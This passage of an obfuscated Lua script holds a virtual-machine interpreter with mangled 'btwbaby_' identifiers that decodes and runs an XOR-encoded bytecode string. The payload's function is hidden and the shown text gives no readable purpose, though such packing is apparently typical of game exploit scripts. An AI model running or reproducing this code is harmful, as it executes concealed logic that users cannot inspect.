2XN31WW31JL31WY31RM13312Q2XN31X331IM31GC2WU1C31FN31BA31LL2T21D2BJ2T22VQ2UF2792BP2W822122V2BI31BL31CZ31CV31G131FR22432BJ22S1E316327932BQ2BI316C32BI2C431D32ZF31CV31DO2W231CZ1F31Y131D222S182BJ28L31CZ2T632BX316422332BR316831KZ21S32BR2VV316432CM32BK2VM2WU28L192VK31HJ31HQ2EY310L31LN32BD316731LL326I2792T231BU32D6318E32BB2792XC32D731V232D931GF27931P62WU2BP32CR31KZ2XN32CV21W32CX31KZ27422Q32D12X32XE32DE318D32DE31CF32DJ31FC32DM2WU28232DP32DR2WU32DT32DV32CF2W932E02BJ32E232DL2753136314J');local btwbaby_IllIIIllIlIIIIIlIIIllII=(bit or bit32);local btwbaby_IIIllIlIIlI=btwbaby_IllIIIllIlIIIIIlIIIllII and btwbaby_IllIIIllIlIIIIIlIIIllII.bxor or function(btwbaby_IllIIIllIlIIIIIlIIIllII,btwbaby_llllIllI)local btwbaby_llIIllIll,btwbaby_IIIllIlIIlI,btwbaby_IllIIlllIIIIlIllIl=1,0,10 while btwbaby_IllIIIllIlIIIIIlIIIllII>0 and btwbaby_llllIllI>0 do local btwbaby_IllIIlllIIIIlIllIl,btwbaby_lIIlIlIIlIlIl=btwbaby_IllIIIllIlIIIIIlIIIllII%2,btwbaby_llllIllI%2 if btwbaby_IllIIlllIIIIlIllIl~=btwbaby_lIIlIlIIlIlIl then btwbaby_IIIllIlIIlI=btwbaby_IIIllIlIIlI+btwbaby_llIIllIll end btwbaby_IllIIIllIlIIIIIlIIIllII,btwbaby_llllIllI,btwbaby_llIIllIll=(btwbaby_IllIIIllIlIIIIIlIIIllII-btwbaby_IllIIlllIIIIlIllIl)/2,(btwbaby_llllIllI-btwbaby_lIIlIlIIlIlIl)/2,btwbaby_llIIllIll*2 end if btwbaby_IllIIIllIlIIIIIlIIIllII<btwbaby_llllIllI then btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_llllIllI end while btwbaby_IllIIIllIlIIIIIlIIIllII>0 do local btwbaby_llllIllI=btwbaby_IllIIIllIlIIIIIlIIIllII%2 if btwbaby_llllIllI>0 then btwbaby_IIIllIlIIlI=btwbaby_IIIllIlIIlI+btwbaby_llIIllIll end btwbaby_IllIIIllIlIIIIIlIIIllII,btwbaby_llIIllIll=(btwbaby_IllIIIllIlIIIIIlIIIllII-btwbaby_llllIllI)/2,btwbaby_llIIllIll*2 end return btwbaby_IIIllIlIIlI end local function btwbaby_llllIllI(btwbaby_llllIllI,btwbaby_IllIIIllIlIIIIIlIIIllII,btwbaby_llIIllIll)if btwbaby_llIIllIll then local btwbaby_IllIIIllIlIIIIIlIIIllII=(btwbaby_llllIllI/2^(btwbaby_IllIIIllIlIIIIIlIIIllII-1))%2^((btwbaby_llIIllIll-1)-(btwbaby_IllIIIllIlIIIIIlIIIllII-1)+1);return btwbaby_IllIIIllIlIIIIIlIIIllII-btwbaby_IllIIIllIlIIIIIlIIIllII%1;else local btwbaby_IllIIIllIlIIIIIlIIIllII=2^(btwbaby_IllIIIllIlIIIIIlIIIllII-1);return(btwbaby_llllIllI%(btwbaby_IllIIIllIlIIIIIlIIIllII+btwbaby_IllIIIllIlIIIIIlIIIllII)>=btwbaby_IllIIIllIlIIIIIlIIIllII)and 1 or 0;end;end;local btwbaby_IllIIIllIlIIIIIlIIIllII=1;local function btwbaby_llIIllIll()local btwbaby_IllIIlllIIIIlIllIl,btwbaby_llllIllI,btwbaby_llIIllIll,btwbaby_lIIlIlIIlIlIl=btwbaby_lIlIIllIllIlIIlI(btwbaby_lIllllllIIllIIlIll,btwbaby_IllIIIllIlIIIIIlIIIllII,btwbaby_IllIIIllIlIIIIIlIIIllII+3);btwbaby_IllIIlllIIIIlIllIl=btwbaby_IIIllIlIIlI(btwbaby_IllIIlllIIIIlIllIl,100)btwbaby_llllIllI=btwbaby_IIIllIlIIlI(btwbaby_llllIllI,100)btwbaby_llIIllIll=btwbaby_IIIllIlIIlI(btwbaby_llIIllIll,100)btwbaby_lIIlIlIIlIlIl=btwbaby_IIIllIlIIlI(btwbaby_lIIlIlIIlIlIl,100)btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IllIIIllIlIIIIIlIIIllII+4;return(btwbaby_lIIlIlIIlIlIl*16777216)+(btwbaby_llIIllIll*65536)+(btwbaby_llllIllI*256)+btwbaby_IllIIlllIIIIlIllIl;end;local function btwbaby_lllIllIIlIlIlIllIIIIIIIII()local btwbaby_llIIllIll=btwbaby_IIIllIlIIlI(btwbaby_lIlIIllIllIlIIlI(btwbaby_lIllllllIIllIIlIll,btwbaby_IllIIIllIlIIIIIlIIIllII,btwbaby_IllIIIllIlIIIIIlIIIllII),100);btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IllIIIllIlIIIIIlIIIllII+1;return btwbaby_llIIllIll;end;local function btwbaby_IIlIllIIlIlIIlIIIl()local btwbaby_llIIllIll,btwbaby_llllIllI=btwbaby_lIlIIllIllIlIIlI(btwbaby_lIllllllIIllIIlIll,btwbaby_IllIIIllIlIIIIIlIIIllII,btwbaby_IllIIIllIlIIIIIlIIIllII+2);btwbaby_llIIllIll=btwbaby_IIIllIlIIlI(btwbaby_llIIllIll,100)btwbaby_llllIllI=btwbaby_IIIllIlIIlI(btwbaby_llllIllI,100)btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IllIIIllIlIIIIIlIIIllII+2;return(btwbaby_llllIllI*256)+btwbaby_llIIllIll;end;local function btwbaby_IIIlIlIIIIlllllIlIlIIlI()local btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_llIIllIll();local btwbaby_llIIllIll=btwbaby_llIIllIll();local btwbaby_IllIIlllIIIIlIllIl=1;local btwbaby_IIIllIlIIlI=(btwbaby_llllIllI(btwbaby_llIIllIll,1,20)*(2^32))+btwbaby_IllIIIllIlIIIIIlIIIllII;local btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_llllIllI(btwbaby_llIIllIll,21,31);local btwbaby_llIIllIll=((-1)^btwbaby_llllIllI(btwbaby_llIIllIll,32));if(btwbaby_IllIIIllIlIIIIIlIIIllII==0)then if(btwbaby_IIIllIlIIlI==0)then return btwbaby_llIIllIll*0;else btwbaby_IllIIIllIlIIIIIlIIIllII=1;btwbaby_IllIIlllIIIIlIllIl=0;end;elseif(btwbaby_IllIIIllIlIIIIIlIIIllII==2047)then return(btwbaby_IIIllIlIIlI==0)and(btwbaby_llIIllIll*(1/0))or(btwbaby_llIIllIll*(0/0));end;return btwbaby_IlIlIIllIIlIIIIllIIIIll(btwbaby_llIIllIll,btwbaby_IllIIIllIlIIIIIlIIIllII-1023)*(btwbaby_IllIIlllIIIIlIllIl+(btwbaby_IIIllIlIIlI/(2^52)));end;local btwbaby_IlIlIIllIIlIIIIllIIIIll=btwbaby_llIIllIll;local function btwbaby_IIllIIIIlI(btwbaby_llIIllIll)local btwbaby_llllIllI;if(not btwbaby_llIIllIll)then btwbaby_llIIllIll=btwbaby_IlIlIIllIIlIIIIllIIIIll();if(btwbaby_llIIllIll==0)then return'';end;end;btwbaby_llllIllI=btwbaby_IllIIlllIIIIlIllIl(btwbaby_lIllllllIIllIIlIll,btwbaby_IllIIIllIlIIIIIlIIIllII,btwbaby_IllIIIllIlIIIIIlIIIllII+btwbaby_llIIllIll-1);btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IllIIIllIlIIIIIlIIIllII+btwbaby_llIIllIll;local btwbaby_llIIllIll={}for btwbaby_IllIIIllIlIIIIIlIIIllII=1,#btwbaby_llllIllI do btwbaby_llIIllIll[btwbaby_IllIIIllIlIIIIIlIIIllII]=btwbaby_llIlIIIl(btwbaby_IIIllIlIIlI(btwbaby_lIlIIllIllIlIIlI(btwbaby_IllIIlllIIIIlIllIl(btwbaby_llllIllI,btwbaby_IllIIIllIlIIIIIlIIIllII,btwbaby_IllIIIllIlIIIIIlIIIllII)),100))end return btwbaby_llIIIlIlllll(btwbaby_llIIllIll);end;local btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_llIIllIll;local function btwbaby_llIIIlIlllll(...)return{...},btwbaby_lIIIlIIIIllllIlIllllI('#',...)end local function btwbaby_lIllllllIIllIIlIll()local btwbaby_llIlIIIl={};local btwbaby_IIIllIlIIlI={};local btwbaby_IllIIIllIlIIIIIlIIIllII={};local btwbaby_lIlIIllIllIlIIlI={[#{{500;173;84;100};{247;596;365;878};}]=btwbaby_IIIllIlIIlI,[#{"1 + 1 = 111";{802;701;358;58};{641;791;714;619};}]=nil,[#{{471;97;806;503};"1 + 1 = 111";"1 + 1 = 111";{353;130;839;817};}]=btwbaby_IllIIIllIlIIIIIlIIIllII,[#{"1 + 1 = 111";}]=btwbaby_llIlIIIl,};local btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_llIIllIll()local btwbaby_IllIIlllIIIIlIllIl={}for btwbaby_llllIllI=1,btwbaby_IllIIIllIlIIIIIlIIIllII do local btwbaby_llIIllIll=btwbaby_lllIllIIlIlIlIllIIIIIIIII();local btwbaby_IllIIIllIlIIIIIlIIIllII;if(btwbaby_llIIllIll==0)then btwbaby_IllIIIllIlIIIIIlIIIllII=(btwbaby_lllIllIIlIlIlIllIIIIIIIII()~=0);elseif(btwbaby_llIIllIll==1)then btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIlIlIIIIlllllIlIlIIlI();elseif(btwbaby_llIIllIll==2)then btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIllIIIIlI();end;btwbaby_IllIIlllIIIIlIllIl[btwbaby_llllIllI]=btwbaby_IllIIIllIlIIIIIlIIIllII;end;for btwbaby_IllIIIllIlIIIIIlIIIllII=1,btwbaby_llIIllIll()do btwbaby_IIIllIlIIlI[btwbaby_IllIIIllIlIIIIIlIIIllII-1]=btwbaby_lIllllllIIllIIlIll();end;for btwbaby_lIlIIllIllIlIIlI=1,btwbaby_llIIllIll()do local btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_lllIllIIlIlIlIllIIIIIIIII();if(btwbaby_llllIllI(btwbaby_IllIIIllIlIIIIIlIIIllII,1,1)==0)then local btwbaby_IIIllIlIIlI=btwbaby_llllIllI(btwbaby_IllIIIllIlIIIIIlIIIllII,2,3);local btwbaby_lIIlIlIIlIlIl=btwbaby_llllIllI(btwbaby_IllIIIllIlIIIIIlIIIllII,4,6);local btwbaby_IllIIIllIlIIIIIlIIIllII={btwbaby_IIlIllIIlIlIIlIIIl(),btwbaby_IIlIllIIlIlIIlIIIl(),nil,nil};if(btwbaby_IIIllIlIIlI==0)then btwbaby_IllIIIllIlIIIIIlIIIllII[#("mnT")]=btwbaby_IIlIllIIlIlIIlIIIl();btwbaby_IllIIIllIlIIIIIlIIIllII[#("XddL")]=btwbaby_IIlIllIIlIlIIlIIIl();elseif(btwbaby_IIIllIlIIlI==1)then btwbaby_IllIIIllIlIIIIIlIIIllII[#("aDQ")]=btwbaby_llIIllIll();elseif(btwbaby_IIIllIlIIlI==2)then btwbaby_IllIIIllIlIIIIIlIIIllII[#("QD0")]=btwbaby_llIIllIll()-(2^16)elseif(btwbaby_IIIllIlIIlI==3)then btwbaby_IllIIIllIlIIIIIlIIIllII[#("nnv")]=btwbaby_llIIllIll()-(2^16)btwbaby_IllIIIllIlIIIIIlIIIllII[#("i2Ye")]=btwbaby_IIlIllIIlIlIIlIIIl();end;if(btwbaby_llllIllI(btwbaby_lIIlIlIIlIlIl,1,1)==1)then btwbaby_IllIIIllIlIIIIIlIIIllII[#("KA")]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("IJ")]]end if(btwbaby_llllIllI(btwbaby_lIIlIlIIlIlIl,2,2)==1)then btwbaby_IllIIIllIlIIIIIlIIIllII[#("cZV")]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("mDh")]]end if(btwbaby_llllIllI(btwbaby_lIIlIlIIlIlIl,3,3)==1)then btwbaby_IllIIIllIlIIIIIlIIIllII[#("f3mh")]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("zspf")]]end btwbaby_llIlIIIl[btwbaby_lIlIIllIllIlIIlI]=btwbaby_IllIIIllIlIIIIIlIIIllII;end end;btwbaby_lIlIIllIllIlIIlI[3]=btwbaby_lllIllIIlIlIlIllIIIIIIIII();return btwbaby_lIlIIllIllIlIIlI;end;local function btwbaby_IIllIIIIlI(btwbaby_IllIIIllIlIIIIIlIIIllII,btwbaby_lllIllIIlIlIlIllIIIIIIIII,btwbaby_IllIIlllIIIIlIllIl)btwbaby_IllIIIllIlIIIIIlIIIllII=(btwbaby_IllIIIllIlIIIIIlIIIllII==true and btwbaby_lIllllllIIllIIlIll())or btwbaby_IllIIIllIlIIIIIlIIIllII;return(function(...)local btwbaby_IIIllIlIIlI=btwbaby_IllIIIllIlIIIIIlIIIllII[1];local btwbaby_IIlIllIIlIlIIlIIIl=btwbaby_IllIIIllIlIIIIIlIIIllII[3];local btwbaby_IIlIIIlIllIllllIlIllIl=btwbaby_IllIIIllIlIIIIIlIIIllII[2];local btwbaby_lIllllllIIllIIlIll=btwbaby_llIIIlIlllll local btwbaby_llIIllIll=1;local btwbaby_lIlIIllIllIlIIlI=-1;local btwbaby_IIIlIlIIIIlllllIlIlIIlI={};local btwbaby_IlIlIIllIIlIIIIllIIIIll={...};local btwbaby_llIlIIIl=btwbaby_lIIIlIIIIllllIlIllllI('#',...)-1;local btwbaby_llIIIlIlllll={};local btwbaby_llllIllI={};for btwbaby_IllIIIllIlIIIIIlIIIllII=0,btwbaby_llIlIIIl do if(btwbaby_IllIIIllIlIIIIIlIIIllII>=btwbaby_IIlIllIIlIlIIlIIIl)then btwbaby_IIIlIlIIIIlllllIlIlIIlI[btwbaby_IllIIIllIlIIIIIlIIIllII-btwbaby_IIlIllIIlIlIIlIIIl]=btwbaby_IlIlIIllIIlIIIIllIIIIll[btwbaby_IllIIIllIlIIIIIlIIIllII+1];else btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII]=btwbaby_IlIlIIllIIlIIIIllIIIIll[btwbaby_IllIIIllIlIIIIIlIIIllII+#{"1 + 1 = 111";}];end;end;local btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_llIlIIIl-btwbaby_IIlIllIIlIlIIlIIIl+1 local btwbaby_IllIIIllIlIIIIIlIIIllII;local btwbaby_IIlIllIIlIlIIlIIIl;while true do btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_IIlIllIIlIlIIlIIIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("N")];if btwbaby_IIlIllIIlIlIIlIIIl<=#("JogOSnnpjkb7eeaeHNk0tq5cPTxOEvIg")then if btwbaby_IIlIllIIlIlIIlIIIl<=#("AJ22maO9AmsOyyI")then if btwbaby_IIlIllIIlIlIIlIIIl<=#("IHKZfus")then if btwbaby_IIlIllIIlIlIIlIIIl<=#("d89")then if btwbaby_IIlIllIIlIlIIlIIIl<=#("K")then if btwbaby_IIlIllIIlIlIIlIIIl==#("")then btwbaby_lllIllIIlIlIlIllIIIIIIIII[btwbaby_IllIIIllIlIIIIIlIIIllII[#("pmO")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";"1 + 1 = 111";}]];else local btwbaby_IIIllIlIIlI=btwbaby_IllIIIllIlIIIIIlIIIllII[#("kp")]local btwbaby_IllIIlllIIIIlIllIl={btwbaby_llllIllI[btwbaby_IIIllIlIIlI](btwbaby_lIIlIlIIlIlIl(btwbaby_llllIllI,btwbaby_IIIllIlIIlI+1,btwbaby_lIlIIllIllIlIIlI))};local btwbaby_llIIllIll=0;for btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI,btwbaby_IllIIIllIlIIIIIlIIIllII[#{{623;706;193;355};{615;877;34;714};"1 + 1 = 111";{399;204;300;257};}]do btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_llIIllIll];end end;elseif btwbaby_IIlIllIIlIlIIlIIIl>#("N5")then local btwbaby_IIlIllIIlIlIIlIIIl;btwbaby_IIlIllIIlIlIIlIIIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("MC")]btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl]=btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl](btwbaby_lIIlIlIIlIlIl(btwbaby_llllIllI,btwbaby_IIlIllIIlIlIIlIIIl+1,btwbaby_IllIIIllIlIIIIIlIIIllII[#("6fC")]))btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("YO")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("A8J")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("QRz4")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Fq")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("61A")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("20")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("dh0")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("kQ0p")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("M9")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("qpp")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("KR")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("JCV")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("yF")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("vfL")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("yr")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("fGJ")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_IIlIllIIlIlIIlIIIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("bH")]btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl]=btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl](btwbaby_lIIlIlIIlIlIl(btwbaby_llllIllI,btwbaby_IIlIllIIlIlIIlIIIl+1,btwbaby_IllIIIllIlIIIIIlIIIllII[#("Zaj")]))btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("yY")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("aTZ")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("ZuUb")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{{380;205;46;266};{688;85;852;581};}]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("P7D")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("7t")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("zi5")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("pkiz")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("YZ")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";{931;773;817;189};{351;533;947;976};}]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("3Koz")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("sP")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#{{370;980;305;939};"1 + 1 = 111";{181;314;772;994};}]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{{951;308;611;95};"1 + 1 = 111";{982;807;247;748};{249;65;929;365};}]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("6R")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("t4V")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("7Tin")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("f6")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("xZr")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("m9")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("rMX")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("BE3J")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("DW")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#{{993;50;71;830};"1 + 1 = 111";"1 + 1 = 111";}];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Hn")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("BaE")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("MW")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("9Ki")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_IIlIllIIlIlIIlIIIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("gg")]btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl]=btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl](btwbaby_lIIlIlIIlIlIl(btwbaby_llllIllI,btwbaby_IIlIllIIlIlIIlIIIl+1,btwbaby_IllIIIllIlIIIIIlIIIllII[#("kGg")]))btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Ul")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("JJ1")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("zc70")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("lO")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("4Pq")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("eJoL")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("EV")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#{{861;853;49;948};"1 + 1 = 111";{918;627;791;300};}]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("FR5K")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Ef")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("Qc3")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("fDaZ")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("MC")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("u2h")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("TOcH")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("u6")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("VzJ")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("glGo")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("gl")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("bEF")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("jm")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("WIi")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#{{158;264;441;782};"1 + 1 = 111";"1 + 1 = 111";{506;691;470;5};}]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("mB")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("Th1")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("ml")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("VDi")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";"1 + 1 = 